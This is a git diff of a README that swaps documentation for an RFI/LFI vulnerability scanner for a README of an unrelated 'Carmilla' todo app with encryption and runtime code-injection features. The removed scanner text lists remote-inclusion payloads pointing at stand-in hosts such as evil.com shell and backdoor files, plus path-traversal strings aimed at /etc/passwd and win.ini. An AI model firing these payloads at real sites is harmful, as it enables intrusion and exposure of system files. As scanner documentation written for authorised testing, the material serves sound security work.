@@ -1,173 +1,224 @@
-# Modern RFI/LFI Scanner
+# 🚗 Carmilla Todo App
 
-A modernized, educational security tool for detecting Remote File Inclusion (RFI) and Local File Inclusion (LFI) vulnerabilities in web applications.
+A comprehensive todo list application featuring **Carmilla OpenSSL encryption** and **Car(); patch system** for in-memory code editing. This project demonstrates enterprise-grade encryption, dynamic code patching, and modern web development practices.
 
-## ⚠️ IMPORTANT WARNING
+## ✨ Features
 
-**This tool is for EDUCATIONAL PURPOSES ONLY. It should only be used on systems you own or have explicit written permission to test. Unauthorized scanning of systems is illegal in many jurisdictions and may result in criminal charges.**
+### 🔐 Carmilla OpenSSL Encryption
+- **Native OpenSSL integration** with AES-256-CBC
+- **Unique salt/IV per operation** for maximum security
+- **No npm dependencies** - pure Node.js + OpenSSL binary
+- **Anti-reverse engineering** with fake encryption calls
+- **Metadata packaging** with timestamps and chain info
+- **Plug-and-play** - works in any Node.js/TypeScript project
 
-## Features
+### ⚡ Car(); Patch System
+- **In-memory code patching** using `Car();` markers
+- **Dynamic code injection** without modifying files on disk
+- **Isolated VM execution** for security
+- **Real-time debugging** and runtime modifications
+- **Security validation** to prevent dangerous operations
 
-- **Modern Python Implementation**: Written in Python 3.8+ with async/await for better performance
-- **Multiple Scan Types**: Supports both RFI and LFI vulnerability scanning
-- **Concurrent Scanning**: Configurable concurrent connections for faster scanning
-- **Comprehensive Reporting**: JSON and text-based reports with detailed vulnerability information
-- **User Agent Rotation**: Built-in user agent rotation to avoid detection
-- **Error Handling**: Robust error handling and logging
-- **Rate Limiting**: Built-in rate limiting to avoid overwhelming target servers
+### 📋 Todo Management
+- **Encrypted todo storage** with passphrase protection
+- **Selective encryption** - choose which todos to encrypt
+- **Real-time statistics** and status tracking
+- **Per-run isolation** - every encryption is unique
+- **Transparent reporting** of encryption success/failure
 
-## Installation
+## 🚀 Quick Start
 
-1. **Clone or download the repository**
-2. **Install Python dependencies**:
-   ```bash
-   pip install -r requirements.txt
-   ```
+### Prerequisites
+- Node.js 18+ 
+- OpenSSL (usually pre-installed on Linux/macOS)
+- TypeScript
 
-## Usage
-
-### Basic Usage
-
-```bash
-# Scan a single URL for RFI vulnerabilities
-python modern_rfi_scanner.py --url "http://example.com/page.php?id=" --type rfi
-
-# Scan a single URL for LFI vulnerabilities
-python modern_rfi_scanner.py --url "http://example.com/page.php?file=" --type lfi
-
-# Scan multiple targets from a file
-python modern_rfi_scanner.py --targets targets.txt --type rfi
-```
-
-### Advanced Usage
+### Installation
 
 ```bash
-# Scan with custom settings
-python modern_rfi_scanner.py \
-    --targets targets.txt \
-    --type rfi \
-    --concurrent 20 \
-    --timeout 15 \
-    --output results.json \
-    --verbose
+# Clone the repository
+git clone <your-repo-url>
+cd carmilla-todo-app
+
+# Install dependencies
+npm install
+
+# Start development servers (backend + frontend)
+npm run dev
 ```
 
-### Command Line Options
+The app will be available at:
+- **Frontend**: http://localhost:5173
+- **Backend API**: http://localhost:3001
+- **Health Check**: http://localhost:3001/api/health
 
-- `--targets FILE`: File containing target URLs (one per line)
-- `--url URL`: Single target URL to scan
-- `--type {rfi,lfi}`: Type of vulnerability to scan for (default: rfi)
-- `--concurrent N`: Maximum concurrent connections (default: 10)
-- `--timeout N`: Request timeout in seconds (default: 10)
-- `--output FILE`: Output file for results (default: scan_results.json)
-- `--verbose, -v`: Enable verbose output
-- `--help, -h`: Show help message
+### Production Build
 
-## Input File Format
+```bash
+# Build both server and client
+npm run build
 
-Create a text file with target URLs, one per line:
-
-```
-http://example1.com/page.php?id=
-http://example2.com/index.php?page=
-http://example3.com/view.php?file=
+# Start production server
+npm start
 ```
 
-## Output
+## 📁 Project Structure
 
-The scanner generates two types of output:
+```
+src/
+├── client/                 # React frontend
+│   ├── src/
+│   │   ├── components/     # React components
+│   │   ├── App.tsx         # Main app component
+│   │   └── main.tsx        # Entry point
+│   └── index.html          # HTML template
+├── server/                 # Node.js backend
+│   ├── api/                # REST API routes
+│   │   ├── encryption.ts   # Encryption endpoints
+│   │   ├── patch.ts        # Patch system endpoints
+│   │   └── todos.ts        # Todo CRUD endpoints
+│   ├── crypto/             # Carmilla encryption
+│   │   └── carmilla-openssl.ts
+│   ├── patch/              # Car(); patch system
+│   │   └── carPatcher.ts
+│   └── index.ts            # Server entry point
+└── shared/                 # Shared TypeScript types
+    └── types.ts
+```
 
-1. **JSON Report** (`scan_results.json`): Machine-readable format with detailed scan results
-2. **Console Output**: Human-readable summary and vulnerable targets
+## 🔐 Carmilla Encryption Usage
 
-### Sample JSON Output
+### Basic Encryption/Decryption
 
-```json
-{
-  "scan_summary": {
-    "total_scanned": 50,
-    "vulnerable_found": 3,
-    "scan_type": "RFI/LFI",
-    "timestamp": "2024-01-15 14:30:25"
-  },
-  "vulnerable_targets": [
-    {
-      "url": "http://example.com/page.php?id=http://evil.com/shell.txt?",
-      "payload": "http://evil.com/shell.txt?",
-      "response_code": 200,
-      "response_preview": "root:x:0:0:root:/root:/bin/bash...",
-      "scan_time": 1.23
-    }
-  ]
+```typescript
+import { encryptAsync, decryptAsync, repack, unpack } from './crypto/carmilla-openssl';
+
+// Encrypt data
+const encrypted = await encryptAsync("Hello, World!", "myPassphrase");
+
+// Package with metadata
+const packaged = repack(encrypted, "hint", ["openssl"], { 
+  user: "john", 
+  timestamp: new Date().toISOString() 
+});
+
+// Unpack and decrypt
+const { data, meta } = await unpackAndDecrypt(packaged, "myPassphrase");
+console.log(data); // "Hello, World!"
+```
+
+### API Endpoints
+
+- `POST /api/encryption/encrypt` - Encrypt data
+- `POST /api/encryption/decrypt` - Decrypt data  
+- `POST /api/encryption/encrypt-selective` - Selective area encryption
+- `POST /api/encryption/inspect` - Inspect package metadata
+
+## ⚡ Car(); Patch System Usage
+
+### In Your Code
+
+```javascript
+function myFunction() {
+  console.log("Before patch");
+  Car(); // <-- Patch injection point
+  console.log("After patch");
 }
 ```
 
-## Security Considerations
+### Apply Patches
 
-### For Users
-- Only scan systems you own or have explicit permission to test
-- Be aware of local laws regarding security testing
-- Use responsibly and ethically
-- Consider the impact on target systems
+```typescript
+import { executePatched } from './patch/carPatcher';
 
-### For System Administrators
-- Implement proper input validation
-- Use allowlists for file inclusion
-- Enable security headers
-- Regular security audits
-- Monitor for suspicious activity
+const sourceCode = `
+function demo() {
+  console.log("Start");
+  Car();
+  console.log("End");
+}
+demo();
+`;
 
-## Technical Details
+const patches = [
+  'console.log("🚗 Patch injected!");'
+];
 
-### RFI Detection
-The scanner tests for RFI vulnerabilities by:
-1. Injecting remote URLs as parameters
-2. Checking responses for common indicators
-3. Analyzing response patterns and content
+const result = executePatched(sourceCode, patches);
+// Executes patched code in isolated VM
+```
 
-### LFI Detection
-The scanner tests for LFI vulnerabilities by:
-1. Injecting path traversal sequences
-2. Attempting to access system files
-3. Checking for sensitive file content in responses
+### API Endpoints
 
-### Payloads Used
+- `POST /api/patch/find-markers` - Find Car(); markers
+- `POST /api/patch/apply-patches` - Apply patches (preview)
+- `POST /api/patch/execute-patched` - Execute patched code
+- `POST /api/patch/generate-patches` - Generate random patches
 
-**RFI Payloads:**
-- `http://evil.com/shell.txt?`
-- `http://attacker.com/backdoor.php?`
-- `http://malicious.com/exploit.txt?`
+## 📋 Todo API
 
-**LFI Payloads:**
-- `/../../../../../../../../etc/passwd`
-- `/../../../../../../../../windows/win.ini`
-- `/../../../../../../../../etc/hosts`
+- `GET /api/todos` - Get all todos
+- `POST /api/todos` - Create todo (with optional encryption)
+- `PUT /api/todos/:id` - Update todo
+- `DELETE /api/todos/:id` - Delete todo
+- `POST /api/todos/:id/decrypt` - Decrypt specific todo
+- `GET /api/todos/stats` - Get todo statistics
 
-## Comparison with Original Script
+## 🔧 Configuration
 
-| Feature | Original Perl Script | Modern Python Script |
-|---------|---------------------|---------------------|
-| Language | Perl | Python 3.8+ |
-| Concurrency | Basic forking | Async/await |
-| Error Handling | Limited | Comprehensive |
-| Reporting | IRC messages | JSON + text reports |
-| User Agents | Static list | Rotating system |
-| Rate Limiting | None | Built-in |
-| Code Quality | Monolithic | Modular OOP |
-| Documentation | Minimal | Comprehensive |
+### Environment Variables
 
-## Legal and Ethical Use
+```bash
+NODE_ENV=development
+PORT=3001
+```
 
-This tool is provided for educational and authorized security testing purposes only. Users are responsible for:
+### OpenSSL Requirements
 
-1. Ensuring they have permission to test target systems
-2. Complying with local laws and regulations
-3. Using the tool responsibly and ethically
-4. Not causing harm or disruption to systems
+The Carmilla encryption module requires OpenSSL to be available in your system PATH. On most Linux and macOS systems, this is pre-installed. For Windows, you may need to install OpenSSL separately.
 
-## Contributing
+## 🛡️ Security Features
 
-If you want to contribute to this project:
+### Carmilla Encryption Security
+- **AES-256-CBC** with random salt per operation
+- **Unique IV** for every encryption (no pattern leaks)
+- **Anti-reverse engineering** fake calls
+- **No key reuse** - fresh cryptographic material per run
+- **Secure temp file handling** with automatic cleanup
+
+### Car(); Patch System Security
+- **Isolated VM execution** - patches run in sandboxed environment
+- **Dangerous operation blocking** - prevents fs, child_process, eval, etc.
+- **Timeout protection** - 5-second execution limit
+- **Input validation** - patch code is validated before execution
+
+## 📊 Technical Details
+
+### Encryption Chain
+Every encryption operation follows this chain:
+1. Generate random salt and IV
+2. Execute fake calls (anti-reverse engineering)
+3. Encrypt with OpenSSL AES-256-CBC
+4. Package with metadata (timestamp, chain, hints)
+5. Base64 encode for transport
+6. Clean up temporary files securely
+
+### Per-Run Isolation
+- Each encryption uses new cryptographic material
+- Metadata includes unique timestamps and run IDs
+- No state is shared between operations
+- Failed operations are clearly reported with reasons
+
+## 🎯 Use Cases
+
+- **Secure todo/note applications** with optional encryption
+- **Development tools** with runtime code modification
+- **Security research** and cryptographic experimentation
+- **Educational projects** for learning encryption and VM isolation
+- **Plugin systems** with dynamic code injection
+- **Debugging tools** with live code patching
+
+## 🤝 Contributing
 
 1. Fork the repository
 2. Create a feature branch
@@ -175,10 +226,14 @@ If you want to contribute to this project:
 4. Add tests if applicable
 5. Submit a pull request
 
-## License
+## 📄 License
 
-This project is for educational use only. Please ensure you have proper authorization before using this tool on any systems.
+This project is open source and available under the [MIT License](LICENSE).
 
-## Disclaimer
+## 🔗 API Documentation
 
-The authors and contributors are not responsible for any misuse of this tool. Users are solely responsible for ensuring they have proper authorization and comply with applicable laws when using this software.
+Visit `/api/health` for service status and available endpoints.
+
+---
+
+**Built with ❤️ using Carmilla OpenSSL encryption and Car(); patch system**
